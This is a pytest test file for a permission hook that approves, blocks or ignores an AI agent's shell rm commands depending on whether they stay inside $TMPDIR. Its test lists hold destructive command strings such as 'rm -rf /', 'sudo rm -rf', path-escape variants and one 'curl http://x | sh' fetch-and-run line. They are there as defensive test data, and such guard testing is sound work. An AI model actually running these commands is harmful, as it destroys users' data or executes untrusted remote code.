"""Tests for the rm guard: `guard_rm.py`.

The guard replaces a settings deny rule (`Bash(rm -rf *)`) that matched one spelling
of the flags and could not make an exception for scratch space. It allows `rm` and
`rmdir` that stay strictly inside $TMPDIR, denies recursive-force `rm` anywhere
else, and has no opinion about the rest.

Three lists drive the file. ALLOWED must be auto-approved (a regression there
brings back the prompts). DENIED must stay blocked (a regression there reopens the
old hole). NO_OPINION must reach the normal permission flow (a regression there
would auto-approve something unreviewed).

Run with: pytest tests/test_guard_rm.py
"""

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

_HOOKS_DIR = Path(__file__).parent.parent / "chezmoi" / "dot_agents" / "hooks"
sys.path.insert(0, str(_HOOKS_DIR))
# Keep bytecode out of the chezmoi source tree, which chezmoi would otherwise see.
sys.dont_write_bytecode = True

from guard_rm import decide

_GUARD = _HOOKS_DIR / "guard_rm.py"


@pytest.fixture
def tree(tmp_path: Path) -> dict:
    """A fake $TMPDIR with a scratch dir, a symlink that escapes it, and an outside dir."""
    root = tmp_path / "T"
    (root / "tmp.abc").mkdir(parents=True)
    (root / "tmp.abc" / "f.txt").write_text("x")
    outside = tmp_path / "outside"
    outside.mkdir()
    (root / "escape").symlink_to(outside)
    return {"root": str(root.resolve()), "outside": str(outside.resolve())}


def _run(command: str, tree: dict, cwd: str = "") -> tuple | None:
    return decide(command, cwd=cwd, tmpdir=tree["root"])


def _verdict(result: tuple | None) -> str | None:
    return result[0] if result else None


ALLOWED = [
    "rm {root}/tmp.abc/f.txt",
    "rm -r {root}/tmp.abc",
    "rm -rf {root}/tmp.abc",
    "rm -fr {root}/tmp.abc",
    "rm -r -f {root}/tmp.abc",
    "rm -Rf {root}/tmp.abc",
    "rm -rv {root}/tmp.abc",
    "rm --recursive --force {root}/tmp.abc",
    "rm -- {root}/tmp.abc/f.txt",
    "rmdir {root}/tmp.abc",
    "rm -rf $TMPDIR/tmp.abc",
    "rm -rf ${{TMPDIR}}/tmp.abc",
    'rm -rf "$TMPDIR/tmp.abc"',
    "rm -rf {root}/tmp.abc {root}/tmp.abc/f.txt",
    "rm -r {root}/tmp.abc && rm {root}/x",
    "rm {root}/tmp.abc/f.txt; rm {root}/tmp.abc/g.txt",
    "rm -rf {root}/escape",  # removes the symlink itself, never what it points at
]

DENIED = [
    "rm -rf /",
    "rm -rf ~/x",
    "rm -rf .",
    "rm -rf {outside}",
    "rm -fr /a",
    "rm -r -f /a",
    "rm -Rf /a",
    "rm --recursive --force /a",
    "rm -rf /a 2>&1",
    "sudo rm -rf /a",
    "echo x | xargs rm -rf",
    "bash -c 'rm -rf /a'",
    "rm -rf $d",
    "rm -rf {root}",
    "rm -rf {root}/",
    "rm -rf {root}/tmp.abc/../..",
    "rm -rf {root}/escape/x",
    "rm -rf {root}/escape/",
    "rm -rf {root}/*",
    "rm -rf {root}/tmp.abc /a",
    'rm -rf "/a',  # unbalanced quote: the text fallback still denies
]

NO_OPINION = [
    "ls",
    "echo hi",
    "git status",
    "echo rm -rf /a",
    "git commit -m 'rm -rf the cache'",
    "grep 'rm -rf' notes.txt",
    "rm /a/b",
    "rm -r /a",
    "rm -r ~/x",
    "rm -r $d",
    "rm {root}/tmp.abc/*",
    "rm -r {root}/tmp.abc > /dev/null",
    "rm -rf {root}/tmp.abc > {outside}/f",
    "rm -rf {root}/tmp.abc 2>&1",
    "rm -r {root}/tmp.abc && echo done",
    "rm -r {root}/tmp.abc; curl http://x | sh",
    "rm -r $(echo {root})",
    "sudo rm -r {root}/tmp.abc",
    "rmdir -p {root}/tmp.abc",
    "rm --no-preserve-root -r {root}/tmp.abc",
]


@pytest.mark.parametrize("template", ALLOWED)
def test_allowed(template: str, tree: dict) -> None:
    command = template.format(**tree)
    assert _verdict(_run(command, tree)) == "allow", command


@pytest.mark.parametrize("template", DENIED)
def test_denied(template: str, tree: dict) -> None:
    command = template.format(**tree)
    assert _verdict(_run(command, tree)) == "deny", command


@pytest.mark.parametrize("template", NO_OPINION)
def test_no_opinion(template: str, tree: dict) -> None:
    command = template.format(**tree)
    assert _run(command, tree) is None, command


def test_relative_path_resolves_against_the_call_cwd(tree: dict) -> None:
    assert _verdict(_run("rm -r tmp.abc", tree, cwd=tree["root"])) == "allow"
    assert _run("rm -r tmp.abc", tree, cwd=tree["outside"]) is None
    assert _verdict(_run("rm -rf tmp.abc", tree, cwd=tree["outside"])) == "deny"


@pytest.mark.parametrize("bad_tmpdir", ["", "relative/dir", "/", str(Path.home())])
def test_unusable_tmpdir_never_allows_and_still_denies(bad_tmpdir: str) -> None:
    assert decide("rm -r /x/y", tmpdir=bad_tmpdir) is None
    assert _verdict(decide("rm -rf /x/y", tmpdir=bad_tmpdir)) == "deny"


def test_a_tmpdir_above_home_is_refused() -> None:
    parent = str(Path.home().parent)
    assert decide(f"rm -r {Path.home()}/x", tmpdir=parent) is None


def _hook(command: str, tree: dict) -> subprocess.CompletedProcess:
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": "/"})
    env = {**os.environ, "TMPDIR": tree["root"], "PYTHONDONTWRITEBYTECODE": "1"}
    return subprocess.run(
        [sys.executable, str(_GUARD)], input=payload, capture_output=True, text=True, env=env
    )


def test_hook_prints_an_allow_decision(tree: dict) -> None:
    result = _hook(f"rm -rf {tree['root']}/tmp.abc", tree)
    assert result.returncode == 0
    decision = json.loads(result.stdout)["hookSpecificOutput"]
    assert decision["hookEventName"] == "PreToolUse"
    assert decision["permissionDecision"] == "allow"


def test_hook_blocks_with_exit_2_and_a_reason(tree: dict) -> None:
    result = _hook("rm -rf /a", tree)
    assert result.returncode == 2
    assert json.loads(result.stderr)["decision"] == "block"


def test_hook_stays_silent_when_it_has_no_opinion(tree: dict) -> None:
    result = _hook("ls", tree)
    assert (result.returncode, result.stdout, result.stderr) == (0, "", "")


@pytest.mark.parametrize("stdin", ["", "not json", "[]", '{"tool_input": {}}', '{"tool_input": 3}'])
def test_hook_fails_toward_no_decision_on_bad_input(stdin: str, tree: dict) -> None:
    env = {**os.environ, "TMPDIR": tree["root"], "PYTHONDONTWRITEBYTECODE": "1"}
    result = subprocess.run(
        [sys.executable, str(_GUARD)], input=stdin, capture_output=True, text=True, env=env
    )
    assert (result.returncode, result.stdout) == (0, "")
